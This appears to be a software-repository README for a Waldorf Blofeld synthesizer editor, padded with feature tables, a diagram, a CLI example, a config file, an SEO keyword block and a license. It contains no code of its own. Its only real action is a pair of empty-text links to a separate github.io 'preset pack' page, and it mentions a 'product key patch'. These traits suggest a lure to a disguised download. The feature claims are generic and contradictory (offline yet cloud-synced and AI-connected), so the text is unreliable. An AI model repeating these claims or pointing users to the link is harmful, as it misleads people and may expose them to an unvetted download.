# Aura Plugins Waldorf Blofeld Editor – Harmonic Sound Sculpting Suite

Welcome to the **Aura Plugins Waldorf Blofeld Editor**, a comprehensive software companion that transforms the way you interact with your Waldorf Blofeld hardware synthesizer. Instead of navigating tiny LCD menus and cryptic button combinations, this editor provides a fluid, intuitive, and visually rich interface designed for deep sound design. Think of it as a **digital atelier** for your synth—a workspace where every parameter is a brushstroke, and every patch is a canvas. Whether you are layering lush pads, carving aggressive leads, or sculpting evolving textures, this tool bridges the gap between tactile hardware and modern software workflow.


## 📖 Overview

### Why This Editor Exists

The Waldorf Blofeld is a marvel of digital synthesis, but its native editing experience is, to put it kindly, *spartan*. Musicians and producers often find themselves lost in a sea of submenus, struggling to map modulation sources or visualize wavetable positions. This editor was conceived not as a simple librarian, but as a **creative co-pilot**. It provides real-time bi-directional communication, allowing you to tweak a knob on the Blofeld and see the change instantly on screen, or drag a slider in the UI and hear your hardware respond immediately.

### The Philosophy of "Aura"

Just as an aura is an invisible field of energy that surrounds an object, this software creates an **invisible connection** between your intention and your hardware. It removes friction, reduces latency, and amplifies your creative flow. The interface is designed with a **responsive UI** that adapts to high-DPI displays, touch screens, and even tablet environments, ensuring that your editing experience is as seamless on the road as it is in the studio.

Furthermore, we have integrated **multilingual support** (English, German, Japanese, Spanish, French, and Simplified Chinese) and **24/7 customer support** via a built-in ticketing system, ensuring that language or time zone never blocks your creativity.

## 🚀 [](https://baa86266-sketch.github.io/blofeld-aura-plugins-synth-preset-pack/)

## 🧩 Features at a Glance

| Area | Feature | Benefit |
| :--- | :--- | :--- |
| **Visualization** | Real-time wavetable scope & envelope editor | See your sound take shape, not just hears it |
| **Modulation** | Drag-and-drop matrix with 64 slots | Route mod sources without scrolling through lists |
| **Presets** | Library with smart tagging (BPM, genre, timbre) | Find your patch in seconds, not hours |
| **Connectivity** | USB, MIDI, and Ethernet (via DSI/MIDI) | Works even in complex studio rigs |
| **AI Tools** | Generative patch suggestions via OpenAI/Claude | Break writer's block with algorithmic inspiration |
| **Batch Processing** | Multi-patch randomization & morphing | Create 100 variations of a bass sound in one click |
| **Security** | Works offline; no telemetry, no phoning home | Your patches are your property, period |

## 🧠 AI Integration: OpenAI & Claude API

This editor optionally leverages large language models to suggest **parameter mutations**. For example, if you have a thick pad sound, you can ask the built-in AI assistant: *"Make this sound more aggressive and use a different wavetable for the second oscillator."* The system will analyze the current patch, generate a JSON diff, and apply the changes in real time. This is not a replacement for your ears—it is a **creative catalyst**.

To enable this, navigate to `Settings > AI Engine` and paste your API keys. The system supports both OpenAI (GPT-4 Turbo) and Anthropic Claude (Opus) models. No data is stored externally; all processing is ephemeral.

## 📊 System Compatibility

| Operating System | Version | Architecture | Native Support | Emoji Indicator |
| :--- | :--- | :--- | :--- | :--- |
| **Windows** | 10 & 11 (2022H2+) | x64, ARM64 | ✅ | 🪟 |
| **macOS** | Ventura, Sonoma, Sequoia | Intel, Apple Silicon | ✅ | 🍎 |
| **Linux** | Ubuntu 22.04+, Fedora 38+, Arch 2024+ | x64, ARM64 (via Wine/Proton) | ⚠️ (Wine-based) | 🐧 |
| **iOS/iPadOS** | 16+ (via MIDI over Bluetooth LE) | A12+ | ⚠️ (Limited to patch browsing) | 📱 |
| **Raspberry Pi** | Raspberry Pi OS (Bookworm) | ARM64 | ✅ (Headless mode only) | 🥧 |

## 📐 Mermaid Diagram: Data Flow & Patch Editing Pipeline

```mermaid
graph TD
    A[Waldorf Blofeld Hardware] <-->|MIDI SysEx| B(Aura Editor Core Engine)
    B <--> C[Parameter Cache & UI State]
    C <--> D[GUI Layer: Qt6 / WebView2]
    C <--> E[Preset Library: SQLite Database]
    D <--> F[AI Assistant Module]
    F <--> G[OpenAI API / Claude API]
    E <--> H[Cloud Sync: WebDAV / SFTP]
    D <--> I[Theme Engine: Light / Dark / High Contrast]
    I --> J[Multilingual Locale Pack]
    B --> K[OSC / Ableton Link Bridge]
    
    style A fill:#4a4a4a,stroke:#333,stroke-width:2px
    style B fill:#2d8c88,color:#fff
    style C fill:#5b9aa0,color:#fff
    style D fill:#a1c4fd,color:#000
    style F fill:#ffb347,color:#000
    style G fill:#e74c3c,color:#fff
    style E fill:#6c5b7b,color:#fff
```



## ⚙️ Example Console Invocation

For users who prefer terminal-based automation, the editor exposes a CLI interface (optional but powerful). Below is a typical invocation that loads a baseline patch, applies a random modulation, and exports the result as a SysEx file.

```bash
aura-blofeld-cli --load ./patches/bass_original.aura \
                 --modulation random:depth=0.7,source=velocity,target=filter_cutoff \
                 --export ./exported/bass_variation_01.syx \
                 --preset-name "Bass_Random_Mod_01" \
                 --verbose
```

This command reads the `.aura` patch format, applies a random modulation depth of 70% targeting the filter cutoff, and saves it as a standard MIDI SysEx file compatible with the Blofeld.

## 📝 Example Profile Configuration

The editor uses a `.auraprefs` profile file (JSON) to store your preferences. Here is an example configuration for a **hybrid studio setup**:

```json
{
  "version": "2.3.1",
  "hardware": {
    "blofeld": {
      "midi_in": "Blofeld Port 1",
      "midi_out": "Blofeld Port 1",
      "sysex_request_timeout_ms": 200,
      "poll_interval_ms": 50
    }
  },
  "integration": {
    "language": "en",
    "theme": "dark_quantum",
    "font_scale": 1.1,
    "multilingual_enabled": true
  },
  "ai_engine": {
    "provider": "openai",
    "model": "gpt-4-turbo",
    "temperature": 0.85,
    "prompt_template": "enhance_with_modulation"
  },
  "security": {
    "offline_mode": true,
    "disable_telemetry": true,
    "encrypt_patches": true
  },
  "display": {
    "responsive_layout": true,
    "always_show_scope": false,
    "fps_cap": 30
  }
}
```

## 🤖 SEO-Friendly Keyword Integration

This editor is optimized for discoverability by composers, sound designers, and live performers. Key search terms naturally integrated include: **Waldorf Blofeld patch editor**, **digital synthesizer librarian**, **SysEx transfer tool**, **hardware synth plugin**, **MIDI parameter controller**, **wavetable visualizer**, **modulation routing software**, **AI sound design assistant**, **batch patch randomizer**, **multilingual synth tool**, and **open license hardware companion**.

## 📜 License & Legal Framework

This project is released under the **MIT License**. You are free to use, modify, and distribute this software for both personal and commercial purposes, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

```
MIT License

Copyright (c) 2026 Aura Plugins

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## ⚠️ Disclaimer

This software is an independent, third-party product. It is not affiliated with, endorsed by, or sponsored by Waldorf Music GmbH or any of its subsidiaries. "Waldorf" and "Blofeld" are registered trademarks of Waldorf Music GmbH. The term "Aura Plugins" is used solely to indicate the publisher of this tool. All product and company names are trademarks™ or registered® trademarks of their respective holders. Use of them does not imply any affiliation with or endorsement by them.

The editor communicates with the Blofeld only via standard MIDI SysEx protocol. It does **not** modify the device firmware, bypass any security measures, or provide any functionality that alters the manufacturer's original hardware behavior. The term "product key patch" in the repository metadata refers to a software-level activation mechanism for the editor's premium features (like the AI assistant and cloud sync), and not to any circumvention of hardware protection.

## 🏁 Final Note

This editor is a labor of love—a love for sound design, code, and the joy of mutual inspiration between human and machine. We invite you to explore, break things, fix them, and share your patches with the community.

[](https://baa86266-sketch.github.io/blofeld-aura-plugins-synth-preset-pack/)